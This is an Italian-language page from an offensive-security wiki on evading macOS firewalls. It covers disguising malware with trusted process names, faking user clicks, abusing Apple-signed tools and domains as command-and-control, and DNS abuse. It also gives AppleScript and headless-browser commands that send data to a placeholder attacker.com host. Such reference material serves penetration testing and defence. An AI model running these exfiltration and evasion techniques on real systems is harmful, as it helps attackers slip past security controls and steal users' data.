# macOS Bypassing Firewalls

{{#include ../../banners/hacktricks-training.md}}

## Tecniche trovate

Le seguenti tecniche sono state trovate funzionanti in alcune app firewall di macOS.

### Abuso dei nomi nella whitelist

- Ad esempio, chiamare il malware con nomi di processi macOS ben noti come **`launchd`**

### Click sintetico

- Se il firewall chiede il permesso all'utente, far **cliccare su consenti** al malware

### **Utilizzare binari firmati da Apple**

- Come **`curl`**, ma anche altri come **`whois`**

### Domini Apple ben noti

Il firewall potrebbe consentire connessioni a domini Apple ben noti come **`apple.com`** o **`icloud.com`**. E iCloud potrebbe essere utilizzato come C2.

### Bypass generico

Alcune idee per provare a bypassare i firewall

### Controlla il traffico consentito

Conoscere il traffico consentito ti aiuterà a identificare i domini potenzialmente in whitelist o quali applicazioni sono autorizzate ad accedervi.
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### Abusare del DNS

Le risoluzioni DNS vengono eseguite tramite l'applicazione firmata **`mdnsreponder`** che probabilmente sarà autorizzata a contattare i server DNS.

<figure><img src="../../images/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>

### Tramite app del browser

- **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
- Google Chrome
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
- Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
- Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Attraverso le iniezioni di processi

Se puoi **iniettare codice in un processo** che è autorizzato a connettersi a qualsiasi server, potresti bypassare le protezioni del firewall:

{{#ref}}
macos-proces-abuse/
{{#endref}}

## Riferimenti

- [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)

{{#include ../../banners/hacktricks-training.md}}
